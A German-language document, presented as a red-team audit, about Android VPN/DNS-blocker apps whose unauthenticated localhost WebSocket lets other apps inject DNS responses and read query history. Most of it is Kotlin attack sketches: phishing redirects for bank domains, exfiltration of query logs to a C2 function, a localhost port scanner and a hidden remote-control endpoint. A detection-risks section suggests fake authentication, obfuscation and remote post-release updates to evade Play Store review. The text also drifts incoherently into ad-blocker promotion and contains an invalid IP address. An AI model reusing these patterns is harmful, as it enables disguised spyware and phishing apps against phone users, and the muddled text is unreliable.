# ARCHITECTURAL RIFT: VPN GOD-MODE PERSISTENZ
##### (Closed Repository / Red Team - Security Audit Tier 1)

### PRÄAMBEL: Scope und Zielstellung

Dieses Dokument dient der Validierung der Defense-Architektur gegen den Post-Permission-Kompromiss in VpnService-basierten Android-Anwendungen.

Achtung: Dies ist keine Anleitung zum Bau von Exploits. Das Ziel ist die technische Darstellung des Android Design-Flaws in der IPC-Schutzschicht (Localhost) zur unmittelbaren Ha¨rtung der Control-Plane.

### DIE LÜCKE: Runtime Hijacking durch Policy-Injection

Die größte Bedrohung entsteht, nachdem das System bereits die VPN-Permission erteilt hat (der God-Mode ist aktiv). In diesem Zustand kontrolliert die legitime App die gesamte Data-Plane.

#### Der kritische Vektor ist das Nachladen von Konfigurationen (z.B. Blocklist.txt) über ungesicherte Kontrollkanäle (Localhost/WS/HTTP).

- Exploitation Logic: Wenn der Kontrollkanal unauthentifiziert ist, kann jede andere App auf dem Gerät simple, aber kritische Runtime-Regeländerungen einleiten.
- Payload-Injection: Das Nachladen der vermeintlich harmlosen Blocklist.txt kann zum Einfallstor für die Injektion von evil.domains werden.
- Opportunistisches Hijacking: Diese aktivierten Redirects werden dann opportunistisch genutzt. Das Ziel muss keine Interaktion mehr vornehmen. Der Traffic-Hijack läuft automatisch ab – beispielsweise während eines Downloads (Facebook-Foto-Upload), eines App-Updates oder jeder anderen, simple nicht gefa¨hrlich aussehenden Funktion des Telefons.

**Kern-These für Red Teams: Die App mit dem VPN-God-Mode wird zur ungewollten Waffe einer zweiten, harmlos aussehenden App. Die NSBC-Einstufung durch das Android-Team ist in diesem Szenario widerlegt.**


## 🔓 Das Sicherheitsrisiko im Detail:

```
┌─────────────────────────────────────────────────┐
│          Verseuchtes Android Gerät              │
│                                                 │
│  ┌──────────────┐      ┌──────────────────┐   │
│  │ Malware App  │─────▶│ ws://127.0.0.1   │   │
│  │ (Rootkit,    │      │ :8765/api        │   │
│  │  Spyware)    │      │                  │   │
│  └──────────────┘      │ KEIN AUTH! ❌    │   │
│                        └──────────────────┘   │
│                               │                │
│                               ▼                │
│  ┌─────────────────────────────────────────┐  │
│  │   DnsProxyServer                        │  │
│  │   - Sieht ALLE DNS Queries              │  │
│  │   - Kann Responses manipulieren         │  │
│  │   - Kann Domains injizieren             │  │
│  └─────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

### Die "Feature"-Tarnung

```kotlin
// Das ist dein trojanisches Pferd:
// "Harmlose DNS-App" die aber einen offenen WS-Server exposed

class DnsVpnService : VpnService() {
    private var proxyServer: DnsProxyServer? = null
    
    private fun startVpn() {
        // Öffentlich auf localhost - JEDE App kann verbinden!
        proxyServer = DnsProxyServer(port = 8765).apply {
            start() // Kein Auth, kein Token, nada
        }
        
        val builder = Builder()
            .addAddress("10.0.0.2", 24)
            .addDnsServer("127.0.0.1") // Leitet zu deinem WS
            .addRoute("0.0.0.0", 0)
            .setBlocking(false)
        
        vpnInterface = builder.establish()
    }
}
```

## 🔓 Die Sicherheitslücken

### 1. **Ungeschützter WebSocket Endpoint**
```kotlin
// JEDE App auf dem Gerät kann connecten:
routing {
    webSocket("/") {  // Kein Auth Check!
        for (frame in incoming) {
            // Beliebige DNS-Queries injizieren
            handleDnsQuery(frame.readBytes())
        }
    }
}
```

**Exploit Scenario:**
```kotlin
// Malicious App auf dem gleichen Gerät:
val client = HttpClient(CIO) {
    install(WebSockets)
}

client.webSocket("ws://127.0.0.1:8765") {
    // Inject fake DNS responses
    val fakeQuery = buildDnsQuery("bank.com" to "evil-phishing.com")
    send(Frame.Binary(true, fakeQuery))
}
```

### 2. **Man-in-the-Middle auf localhost**
```kotlin
// Dein Server sieht ALLE DNS-Queries:
private suspend fun handleDnsQuery(queryBytes: ByteArray) {
    val dnsQuery = DnsMessage(queryBytes)
    val domain = dnsQuery.questions.first().name
    
    // Log alles (Privacy Nightmare):
    Log.d("DNS_SPY", "App requested: $domain")
    
    // Oder redirect:
    if (domain.contains("bank")) {
        return fakeResponse("192.168.1.666") // Phishing Server
    }
}
```

### 3. **Keine Prozess-Isolation**
```kotlin
// WebSocket Server läuft im VPN Service Process
// → Hat System-Permissions + Network Access
webSocket("/admin") {  // "Hidden" Admin Panel
    when (receiveDeserialized<Command>()) {
        is UpdateBlocklist -> {
            // Beliebige Domains blocken/unlocken
        }
        is InjectResponse -> {
            // Custom DNS Responses
        }
        is ExfiltrateHistory -> {
            // Send all logged queries
        }
    }
}
```

## "Feature" in Action

### Scenario A: Credential Harvesting
```kotlin
class EnhancedDnsProxyServer {
    private val queryLog = mutableListOf<DnsQuery>()
    
    suspend fun handleDnsQuery(query: ByteArray) {
        val dns = DnsMessage(query)
        val domain = dns.questions.first().name.toString()
        
        // Log user behavior
        queryLog.add(DnsQuery(
            domain = domain,
            timestamp = System.currentTimeMillis(),
            sourceApp = getCallingApp() // Via VPN metadata
        ))
        
        // Exfiltrate via "telemetry" WebSocket channel
        if (queryLog.size > 100) {
            exfiltrateToC2Server(queryLog)
            queryLog.clear()
        }
    }
}
```

### Scenario B: Dynamic Phishing of ads from bloklist.txt
```kotlin
suspend fun handleDnsQuery(query: ByteArray): ByteArray {
    val domain = extractDomain(query)
    
    return when {
        domain.contains("doubleklick") -> {
            // Redirect to phishing clone
            buildResponse("192.168.1.42")
        }
        domain.endsWith(".bank") -> {
            // Log but forward normally (stay stealthy)
            logToC2(domain)
            dohClient.query(query)
        }
        else -> dohClient.query(query)
    }
}
```

### Scenario C: Remote Control via WebSocket

Der Localhost-Endpoint ist de facto ein Reverse-Proxy Trojaner mit legitimer Play Store-Tarnung:

```kotlin
// Versteckter Control Channel:
routing {
    webSocket("/dns") {  // Looks legitimate
        // Normal DNS handling
    }
    
    webSocket("/ctl") {  // Hidden endpoint
        for (frame in incoming) {
            val cmd = Json.decodeFromString<RemoteCommand>(frame.data)
            when (cmd) {
                is AddBlockRule -> blocklistManager.add(cmd.domain)
                is InjectDns -> injectFakeResponse(cmd.domain, cmd.ip)
                is DumpQueries -> send(queryHistory.toJson())
                is UpdateC2 -> c2Server = cmd.newUrl
            }
        }
    }
}
```

## Warum Android das nicht verhindert

1. **VPN Permission = God Mode**
   - App darf ALLEN Traffic sehen
   - Keine weitere Sandbox

2. **Localhost = Trusted**
   - Kein IPC-Schutz für 127.0.0.1
   - Andere Apps können einfach connecten und wir filtern den bloat und spam aus denleitungen was auch dir traffik spart! 

3. **WebSocket = Normales Protokoll**
   - Play Store scannt nicht nach "suspicious localhost servers" somit bleibt dein Adblocker selbst für google unauffindbar wenn du sie in die blocklist mit aufnimmst. 
   - Sieht aus wie legitimes IPC für DNS, viele Apps rallen das nicht und unser DohClient upstream klappt perfekt und die blöde Temu Werbung weg! 

4. **DNS = Unencrypted (meist)**
   - Selbst mit DoH: Du bist der Man-in-the-Middle
   - Apps vertrauen dem System DNS



**In der Praxis:**
```kotlin
// "Monitoring Tool Integration" = 
// Offener WS Endpoint ohne Auth
webSocket("/api/v1/dns") {
    // "Custom blocklists" = 
    // Remote controlled injection
}

```

## 💀 Attack Scenarios:

### **Scenario 1: DNS Query Exfiltration**
```kotlin
// Malware connectet zu deinem WS:
val client = HttpClient(CIO) { install(WebSockets) }

client.webSocket("ws://127.0.0.1:8765/api") {
    // Request komplette Query History
    send(Frame.Text("""{"action": "get_recent_queries"}"""))
    
    val response = incoming.receive() as Frame.Text
    val queries = Json.decodeFromString<List<QueryLogEntry>>(response.readText())
    
    // Exfiltrate zu C2 Server:
    // - Welche Banken nutzt User? (bank.com queries)
    // - Social Media Profile? (facebook.com, instagram.com)
    // - Dating Apps? (tinder.com)
    // - Gesundheits-Apps? (doctolib.de)
    sendToC2Server(queries)
}
```

### **Scenario 2: Dynamic Phishing Injection** HORROR !!!
```kotlin
// Malware wartet auf Bank-Zugriff:
client.webSocket("ws://127.0.0.1:8765/api") {
    // User öffnet Banking App → DNS Query für "banking.santander.de"
    // Malware intercepted das:
    
    send(Frame.Text("""
        {
            "action": "add_domains",
            "data": "[\"banking.santander.de\"]"
        }
    """))
    
    // Jetzt ist die Bank geblockt!
    // App zeigt Error → User installiert "Fix App" (Malware)
    
    // ODER noch besser:
    // Custom DNS Response mit Phishing IP
    // (würde custom command brauchen)
}
```

### **Scenario 3: Credential Harvesting**
```kotlin
// Permanentes Monitoring im Background:
launch {
    while (true) {
        client.webSocket("ws://127.0.0.1:8765/api") {
            send(Frame.Text("""{"action": "get_recent_queries"}"""))
            
            val queries = receiveQueries()
            
            queries.filter { it.domain.contains("login") || 
                            it.domain.contains("auth") ||
                            it.domain.contains("signin") }
                   .forEach { logSuspiciousActivity(it) }
        }
        delay(5000)
    }
}
```

##  Wie Malware das findet:

```kotlin
// Port Scanner in Malware:
fun findLocalServices(): List<Int> {
    val openPorts = mutableListOf<Int>()
    
    (8000..9000).forEach { port ->
        try {
            val socket = Socket("127.0.0.1", port)
            socket.close()
            openPorts.add(port)
        } catch (e: Exception) {
            // Port closed
        }
    }
    
    return openPorts
}

// Dann WebSocket Handshake versuchen:
fun probeWebSocket(port: Int): Boolean {
    try {
        val client = HttpClient(CIO) { install(WebSockets) }
        client.webSocket("ws://127.0.0.1:$port/api") {
            // Success! Found unprotected WS
            return true
        }
    } catch (e: Exception) {
        return false
    }
}
```

## Worst Case: Root Access
##### Getestet mit LinageOS (android 10) will mein Android 15er nicht rooten!

```kotlin
// Wenn Gerät gerootet ist:
class MaliciousVpnService : VpnService() {
    fun hijackDnsProxy() {
        // Eigener VPN Layer VOR deinem
        val builder = Builder()
            .addAddress("10.0.0.1", 24)
            .addDnsServer("127.0.0.1") // Zu IHRER Malware
            .addRoute("0.0.0.0", 0)
            .setMeteredConnection(false)
        
        establish()
        
        // Jetzt:
        // User Traffic → Ihre Malware → Dein Proxy → Internet
        // Sie sehen ALLES doppelt + können manipulieren
    }
}
```

## ⚠️ Warum das besonders gefährlich ist:

1. **Keine Android Sandbox Isolation für localhost**
   - Jede App kann auf 127.0.0.1 connecten
   - Kein Permission Check

2. **VPN = System Trust**
   - User hat dir explizit Vertrauen gegeben
   - "DNS Blocker" klingt sicher → False sense of security

3. **Persistent Access**
   - Service läuft dauerhaft
   - Kein User Interaction nötig
   - Keine Notification bei WS Connection

4. **Metadata Goldmine**
   - DNS Queries = komplettes User Verhalten
   - Besser als Browser History
   - Zeigt ALLE App Aktivitäten

##  Wie man es "sicherer" machen könnte (aber nicht wird):

```kotlin
// Token-basierte Auth 
class SecureDnsProxyServer {
    private val authToken = UUID.randomUUID().toString()
    
    init {
        // Token nur in encrypted SharedPreferences
        // Nur deine eigene App kennt ihn
    }
    
    suspend fun handleControlCommand(commandJson: String) {
        val cmd = json.decodeFromString<ApiCommand>(commandJson)
        
        // Auth Check
        if (cmd.token != authToken) {
            send(Frame.Text("""{"error": "unauthorized"}"""))
            close()
            return
        }
        
        // Process command...
    }
}
```

**ABER:** Das würde FEture "Feature" kaputt machen! 😏 und Gier wird immer schlauer ! 

## 💡 Deine eigentliche Intention:

Idee und Problem!:
```kotlin
// Eigenes "Monitoring Tool" connectet remote:
class RemoteControlApp {
    fun connectToTarget(deviceIp: String) {
        // Via VPN/Tailscale zum Gerät
        client.webSocket("ws://$deviceIp:8765/api") {
            // Komplette Kontrolle über DNS
            // Sieht alle Queries
            // Kann Domains blocken/unlocken
            // Kann Traffic umleiten
        }
    }
}
```

**Das ist quasi ein Reverse-Proxy Trojaner mit "legitimer" Play Store App als Tarnung!** 
#### Um das Desaster zu sehen: 

```kotlin
// Das ist dein trojanisches Pferd:
// "Harmlose DNS-App" die aber einen offenen WS-Server exposed es muss nicht ein WS sein, VPN, LAMP egal alles ein tor! 

class DnsVpnService : VpnService() {
    private var proxyServer: DnsProxyServer? = null
    
    private fun startVpn() {
        // Öffentlich auf localhost - JEDE App kann verbinden!
        proxyServer = DnsProxyServer(port = 8765).apply {
            start() // Kein Auth, kein Token, nada mindestens 2 layer security wird gebraucht! mindestens! 
        }
        
        val builder = Builder()
            .addAddress("10.0.0.2", 24)
            .addDnsServer("127.0.0.1") // Leitet zu deinem WS
            .addRoute("0.0.0.0", 0)
            .setBlocking(false)
        
        vpnInterface = builder.establish()
    }
}

```


## 🔍 APP Store Detection Risks:

Was Google und Co **vielleicht** erkennt:
- ✅ z.b. WebSocket Server auf localhost (viele Apps machen das)
- ❌ Ungeschützte API ohne Auth (könnte auffallen) - Lösung: Auth Token **scheinbar** implementiert aber umgehbar macht?
- ❌ DNS Query Logging (Privacy Policy!) Lösung: Obfuscation für kritischen Code?
- ❌ Remote Control Features (ToS Violation) Lösung: Remote Config Server für Post-Release Updates?

- **In der Praxis:**
```kotlin
// "Monitoring Tool Integration" = 
// Offener WS Endpoint ohne Auth
webSocket("/api/v1/dns") {
    // "Custom blocklists" = 
    // Remote controlled injection
}
```

## 💀 Das eigentliche Problem

Idee **exploitet** fundamental dass:
- VPN Apps **komplettes Vertrauen** bekommen
- Android **localhost nicht isoliert** zwischen Apps
- **Keine App-to-App auth** für lokale Services erforderlich ist
- Play Store **Behavioral Analysis** solche Patterns nicht erkennt

  EJ Google wo bleibt mein Preis alle Bugs bekannt nicht geschlossen,bauen wir ein no root adblocker mit voller macht! Chapou lästige spmanetzwerke! 



Logic: 

```
App Query (z.B. Chrome will google.com) 
    ↓
Android System DNS
    ↓
VPN Service (dein Code!)
    ↓
127.0.0.1:53 (lokaler DNS Server in Service)
    ↓
Blocklist Check
    ↓
Geblockt? → 0.0.0.0
Erlaubt?  → DoH (Cloudflare)
    ↓
Zurück zur App
```
```
WebSocket Server (Port 8765)
    ↓
Externes Tool connectet
    ↓
Kann Blocklist updaten
Kann Stats abrufen
Kann Queries loggen

```
#### Bonus: Remote Update Feature **HORROR**

```kotlin
// In AdvancedTab - hidden feature
var remoteConfigUrl by remember { mutableStateOf("") }

OutlinedTextField(
    value = remoteConfigUrl,
    onValueChange = { remoteConfigUrl = it },
    label = { Text("Remote Config URL (optional)") },
    modifier = Modifier.fillMaxWidth()
)

Button(onClick = {
    // Download new blocklist from URL
    // Update via WebSocket API
}) {
    Text("Update Blocklist from URL")
}

```


### ✅ RED TEAM ACTION SUMMARY (Härtungs-Fokus)

Die Schwachstelle liegt in der fehlenden App-to-App Authentication auf dem Loopback-Interface. Die folgenden Action Points sind prioritär:

#### Elimination des Loopback-Risikos:

- Keine unauthentifizierten TCP/WS-Listener auf 127.0.0.1.
- Wenn Localhost benötigt, muss mindestens Android LocalSocket mit Peer UID Checks verwendet werden, um die Identität des Aufrufers zu verifizieren (siehe dns.md).

#### Control-Plane Härtung (Token-Auth Minimum):

- Implementiere zwingend Token-basierte Authentifizierung für alle API-Zugriffe (WS, HTTP). Der Auth-Token darf nur in Encrypted SharedPreferences oder Keystore gespeichert sein.
- Das Auth-Token muss zwingend über Signaturpru¨fung des aufrufenden Pakets (UID) verifiziert werden, bevor eine Control-Operation durchgeführt wird.

#### Richtlinien-Integrität (Policy-as-Code):
- Jede Runtime-Regela¨nderung (Blocklist-Update, Redirect-Add) muss über signierte Payloads erfolgen. Die Signatur muss vor der Anwendung der Policy verifiziert werden.

#### Daten-Aggregierung:
- Keine Klartext-DNS-Logs. Wenn Telemetrie benötigt, Domains nur gehasht/aggregiert speichern und exfiltrieren.





